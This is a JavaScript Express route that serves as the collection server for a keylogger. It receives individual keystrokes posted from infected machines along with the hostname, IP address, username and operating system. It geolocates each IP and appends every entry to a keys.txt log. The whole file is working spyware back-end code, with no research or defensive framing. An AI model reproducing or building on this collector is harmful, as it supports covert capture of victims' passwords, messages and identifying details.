const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const geoip = require('geoip-lite');

router.use(express.json({ limit: '10mb' }));

// Enhanced key mapping for special keys
const KEY_MAPPING = {
    ' ': '[SPACE]',
    '\n': '[ENTER]',
    '\b': '[BACKSPACE]',
    '\t': '[TAB]',
    // Add more special keys as needed
};

router.post('/', async (req, res) => {
    const { type = 'char', data, hostname, ip, username, os } = req.body;

    if (!data && data !== '') return res.status(400).json({ message: 'No data provided' });

    try {
        // Process the incoming data
        let processedData = data;
        
        // Replace special characters with readable tags
        if (type === 'char' && KEY_MAPPING[data]) {
            processedData = KEY_MAPPING[data];
        }

        // GeoIP location
        const geo = ip ? geoip.lookup(ip) : null;
        const location = geo ? `${geo.city || 'Unknown City'}, ${geo.country || 'Unknown Country'}` : 'Unknown';

        // Enhanced log format
        const logLine = `[${new Date().toISOString()}] [${type.toUpperCase()}] ${processedData} | Host: ${hostname || 'unknown'} | IP: ${ip || 'unknown'} | Loc: ${location} | User: ${username || 'unknown'} | OS: ${os || 'unknown'}\n`;

        // Save to log file
        const logPath = path.join(__dirname, '../../logs/keys.txt');
        fs.appendFileSync(logPath, logLine, 'utf8');
        
        res.status(200).json({ 
            message: 'Key logged with system info',
            data: processedData,
            type
        });
    } catch (error) {
        console.error('Logging error:', error.message);
        res.status(500).json({ message: 'Error saving key' });
    }
});
module.exports = router;
